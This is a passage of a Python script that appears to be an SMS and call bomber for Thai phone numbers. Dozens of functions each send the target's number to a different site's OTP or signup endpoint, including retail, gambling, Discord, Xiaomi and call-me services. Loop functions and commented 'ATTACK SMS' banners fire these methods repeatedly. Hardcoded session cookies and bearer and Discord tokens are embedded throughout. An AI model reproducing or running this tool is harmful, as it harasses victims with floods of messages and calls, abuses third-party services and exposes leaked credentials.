uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
            }
        requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0}).json()
        
    def api36(phone):
        head = {
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "*/*",
            "referer": "https://nocnoc.com/login",
            "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
            }
        requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})
        
    def api37(phone):
        requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
        
    def api38(phone):
        requests.post("https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone,'language': "th"})
        
    def api39(phone):
        requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": phone,"password":"","client":"ecommerce"},headers={})
        
    def api40(phone):
        headers={
            "organizationcode": "lifestyle",
            "content-type": "application/json"
            }
        json = {"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone,"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"}
        requests.post("https://graph.firster.com/graphql",headers=headers,json=json)
        
    def api41(phone):
        requests.post("https://m.riches666.com/api/register-otp", data={"brands_id":"60a6563a232a600012521982","agent_register":"60a76a7f233d2900110070e0","tel":phone})
        
    def api42(phone):
        head = {
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "*/*",
            "referer": "https://www.pruksa.com/member/register/otp_code",
            "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
            }
        requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")
        
    def api43(phone):
        head = {
            "content-type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "referer": "https://vaccine.trueid.net/",
            "cookie": "tids=cj6rr5kfn7n5eq48kjvtjshbmm6fl822;visid_incap_2104120=tLQf04X9QQOCL3N5NvNoVFt6lGEAAAAAQUIPAAAAAACBOqMUEW78XaYnxR7kJ7pF;_ga_id=908257605.1637120616;_gcl_au=1.1.781159093.1639210714;_fbp=fb.1.1639210716826.1287073338;visid_incap_2608850=sCqytT60R3yHmHPZaoQgs9WLuGEAAAAAQUIPAAAAAADemRF44I7x0AvVgLWDt3rL;pbjs-pubCommonId=4764c6cc-f296-45a4-873a-5cd0bd43510e;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;unique_user_id=332651712.1639210715;__gads=ID=abe63e684890d998:T=1639484401:S=ALNI_MbXUWyQkNhtJ2m57vxHz6ORO4bxRg;_ga=GA1.2.332651712.1639210715;_gid=GA1.2.465629380.1639888137;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B513FC64.8;_ctout26068=1;verify=test;OptanonConsent=isIABGlobal=false&datestamp=Sun+Dec+19+2021+11%3A29%3A09+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1&geolocation=%3B&AwaitingReconsent=false;OptanonAlertBoxClosed=2021-12-19T04:29:09.733Z;_ga_R05PJC3ZG8=GS1.1.1639888134.6.1.1639888160.34"
            }
        requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers=head,json={"msisdn":phone,"function":"enroll"})
        
    def api44(phone):
        head = {
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "*/*",
            "referer": "https://ufa108.ufabetcash.com/register.php",
            "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"
            }
        requests.post("https://ufa108.ufabetcash.com/api/",headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")


        
    def api46(phone):
        requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})

    def api47(phone):
        requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})

    def api48(phone):
        requests.post("https://m.pgwin168.com/api/register-otp",json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone})

    def api49(phone):
        requests.post("https://www.som777.com/api/otp/register",json ={"applicant": phone,"serviceName":"SOM777"})
        
    def api50(phone):
        requests.post("https://www.konglor888.com/api/otp/register",json = {"applicant": phone,"serviceName":"KONGLOR888"})

    def api51(phone):
        requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
        
    def api52(phone):
        requests.get("https://users.cars24.co.th/oauth/consumer-app/otp/"+phone+"?lang=th", headers = {"accept": "application/json, text/plain, */*","x_vehicle_type":"CAR","cookie":"_ga=GA1.3.523508414.1640152799;_gid=GA1.3.999851247.1640152799;_fbp=fb.2.1640152801502.837786780;_gac_UA-65843992-28=1.1640152807.EAIaIQobChMIi9jVo9329AIVizArCh1bFAuMEAAYASAAEgJqA_D_BwE;_dc_gtm_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjYwMjMzZjYyLTFlMzYtNWZmMy04MjZkLTMzOTAxNTMwODQ4NyIsImNyZWF0ZWQiOjE2NDAxNTI4MDEzMDYsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6ImI4MDNlNTFkLTFiYTYtNGExZi05MGIzLTk5OWRmMjhhM2RiOCIsImNyZWF0ZWQiOjE2NDAxNjY4ODgwNDF9;_hjAbsoluteSessionInProgress=0;cto_bundle=uVFzcF8lMkYxM0hsRGxQc1M4YThaRmhHJTJGRTBtSUdwNzVuRkVldzI5QlpIYktWbnZFcUlzdDZ1ZnhMT3JqVVhFQyUyQmtGUE9MTFk5akpyVnl4ekZnZlJ4UVN3WnRHdUNyJTJGWW03aVRSeWtLc2wxTjA3QmR0THNzcjNsJTJCcEJHSXlOUzNxTVc2ZmJPaGclMkZhRUhkV3I2cTI1dXUlMkZhYnl1dyUzRCUzRA"})

    def api53(phone):
        requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data = {"phone_number": phone,"lag": " "})
        
    def api54(phone):
        requests=Session()
        token=search('<meta name="_csrf" content="(.*)" />',requests.get("https://www.shopat24.com/register/").text).group(1)
        requests.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token})

    def api55(phone):
        session = Session()
        ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
        session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
                
    def api56(phone):
        head = {
            "Host": "discord.com",
            "user-agent": "Discord-Android/106010",
            "authorization": "ODk0NDQ4ODI4NTIxMDE3NDE0.YaxE8A.ZBT5aLO80pM-EVa-tlhqgC-Y1WQ",
            "x-fingerprint": "914875439896473620.4APgJf_b9a3KWMdy7nPtVmQapMo",
            "accept-language": "th",
            "x-super-properties": "eyJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiRGlzY29yZC1BbmRyb2lkLzEwNjAxMCIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwNjAxMCwiY2xpZW50X3ZlcnNpb24iOiIxMDYuMTAgLSBTdGFibGUiLCJkZXZpY2UiOiJBMzdmLCBBMzdmIiwib3MiOiJBbmRyb2lkIiwib3Nfc2RrX3ZlcnNpb24iOiIyMiIsIm9zX3ZlcnNpb24iOiI1LjEuMSIsInN5c3RlbV9sb2NhbGUiOiJ0aC1USCIsImNsaWVudF9wZXJmb3JtYW5jZV9jcHUiOjEwLCJjbGllbnRfcGVyZm9ybWFuY2VfbWVtb3J5IjoxOTk0ODQsImNwdV9jb3JlX2NvdW50Ijo0LCJhY2Nlc3NpYmlsaXR5X3N1cHBvcnRfZW5hYmxlZCI6ZmFsc2UsImFjY2Vzc2liaWxpdHlfZmVhdHVyZXMiOjEyOCwiZGV2aWNlX2FkdmVydGlzZXJfaWQiOiIzNGViOWE0NC05MWVlLTQxYjQtYmE2Yi01MjViNWNmOTc4ODYifQ==",
            "content-type": "application/json; charset=UTF-8",
            "content-length": "24",
            "accept-encoding": "gzip",
            "cookie": "__sdcfduid=52dc782d550211ec9eb842010a0a04ee157ecfac811789d73a2f5a5fbc577e07972e624e3ab09b9534c12f6435839742; __dcfduid=52dc782d550211ec9eb842010a0a04ee"
            }
        requests.post("https://discord.com/api/v9/users/@me/phone",headers=head,json={"phone":"+66"+phone})
        
    def api57(phone):
        requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
        
    def api58(phone):
        head = {
            "x-requested-with": "XMLHttpRequest",
            "accept": "text/html, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "referer": "https://www.tgfone.com/signin/register"
            }
        requests.post("https://www.tgfone.com/signin/otp_chk_fast",headers=head,json=f"mobile={phone}&type_otp=7")

    def api59(phone):
        head = {
            "x-requested-with": "XMLHttpRequest",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "referer": "https://ufa3bb.com/account/register",
            "cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"
            }
        requests.post("https://ufa3bb.com/account/register/sendotp",headers=head,data=f"phone={phone}")
        
    def api60(phone):
        requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
        
    def api61(phone):
        requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone", data={"phoneNumber": f"+66{phone[1:]}"})
        
    def api62(phone):
        requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}")
        
    def api63(phone):
        requests.post("https://asha168vip.com/_ajax_/request-otp", data={"request_otp[phoneNumber]":phone,"request_otp[termAndCondition]": "1","request_otp[_token]": "1642443743"})
        
    def api64(phone):
        requests.post("https://account.xiaomi.com/pass/sendPhoneRegTicket", data=f"region=US&phone=%2B66{phone[1:]}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "captchaToken=mXYXs+xvEHAZdhKnXK1XlopRcisSn05D6xhZU+uL3ghvh1Yf/4rYTExH+2xl+yZv;deviceId=wb_aca09552-fd37-4204-9d7a-20045de5c5bf;uLocale=en"})
        
    def api65(phone):
        requests.post("https://gamingnation.dtac.co.th/api/otp/generate", data={"template":"register","phone_no":phone},headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
        
    def api66(phone):
        requests.post("https://www.aurora.co.th/signin/otp_chk", data=f"mobile={phone}&type_otp=3",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
        
    def api67(phone):
        requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
        
    def api68(phone):
        requests.post("http://716081.com/wap/user/sendPhoneMsg", json={"uri":"/user/sendPhoneMsg","token":"","paramData":{"phoneVerifyType":0,"phoneNumber":f"66{phone[1:]}","siteCode":"intqa"}}).text
        
    def api69(phone):
        requests.post("https://login.928royal.com/api/APISendOTP.php", data=f"mobileNumber=0{phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"})
        
    def api70(phone):
        requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data={"tel":phone,"otp_type":"register"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Basic 755b4608e637d413d668502704d93e377f4f67b2d3d0f50e5644af3607f31ddb3174ecaf5b2c40c86f9efc32de1ee0bbf3e7a2b32cb055a3cb7068e1bb152844"})
        
    def api71(phone):
        requests.post("https://www.bigthailand.com/authentication-service/user/OTP", json={"locale":"th","phone": f"+66{phone[1:]}","email":"dkdk@gmail.com","userParams":{"buyerName":"ekek ks","activateLink":"www.google.com"}},headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg","cookie": "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"})
        
    def api72(phone):
        requests.post("https://api.cashmarket-th.com/app/userinfo/send/smsCode", json={"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":"20220118121149smyjjs57jxtqbwkuu74y0vd6p5yzhrmp86872f73364d46d3bf9446ddd583ef61ee8fafe504bab46ec267ca96a99281d6rreqhrlgsg4p3srgv1i5s4pp8u9la6gf1","termSysVersion":"5.1.1","termModel":"A37f","brand":"","termId":"null","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":"null","lat":"null"},"bizType":"0000","appName":"Cash Market","packageName":"com.cashmarketth.h5","screenResolution":"720,1280"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1642479101529","bizParams":{"phoneNum":phone,"code":"null","type":200,"channelCode":"hJ071"}})
        
    def api73(phone):
        requests.post("https://bacara888.com/api/otp/register",data={"applicant":phone,"serviceName":"gclub"})
        
    def api74(phone):
        requests.post("https://www.tslpv.net/api/v1/sendRegisterSms", data={"national_number":phone,"country_code":"TH","g_token":"null"})
        
    def api75(phone):
        requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
        
    def api76(phone):
        requests.post("https://api.cdfoi9.com/api/v1/index.php", data=f"module=%2Fusers%2FgetVerificationCode&mobile={phone}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded"})
        
    def api77(phone):
        requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
        
    def api79(phone):
        send = Session()
        send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
        snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
        sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")

  
    def api80(phone):
        requests.get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()

    def api81(phone):
        requests.post("https://callmyphone.org/do-call", headers={"User-Agent": useragent}, data={"phone": phone})


####----------------------------------------------------------------------------------------####


#banner1 = (gratient.purple("ATTACK SMS | METHOD : AISPLAY"))
#banner2 = (gratient.purple("ATTACK SMS | METHOD : ICC"))
#banner3 = (gratient.purple("ATTACK SMS | METHOD : VIP"))
#banner4 = (gratient.purple("ATTACK SMS | METHOD : CP"))
#banner5 = (gratient.purple("ATTACK SMS | METHOD : PIZZA"))
#banner6 = (gratient.purple("ATTACK SMS | METHOD : SCGID"))
#banner7 = (gratient.purple("ATTACK SMS | METHOD : SHOPAT24"))
#banner8 = (gratient.purple("ATTACK SMS | METHOD : MCARD"))
#banner9 = (gratient.purple("ATTACK SMS | METHOD : sk1"))
#banner10 = (gratient.purple("ATTACK SMS | METHOD : sk2"))
#banner11 = (gratient.purple("ATTACK SMS | METHOD : sk3"))
#banner12 = (gratient.purple("ATTACK SMS | METHOD : sk4"))
####----------------------------------------------------------------------------------------####

def loop10():
    global num
    SMS.sk1(num)
  #  print("ATTACK SMS '| METHOD : sk1")

def loop11():
    global num
    SMS.sk2(num)
  #  print("ATTACK SMS '| METHOD : sk2")

def loop12():
    global num
    SMS.sk3(num)
  #  print("ATTACK SMS '| METHOD : sk3")

def loop13():
    global num
    SMS.sk4(num)
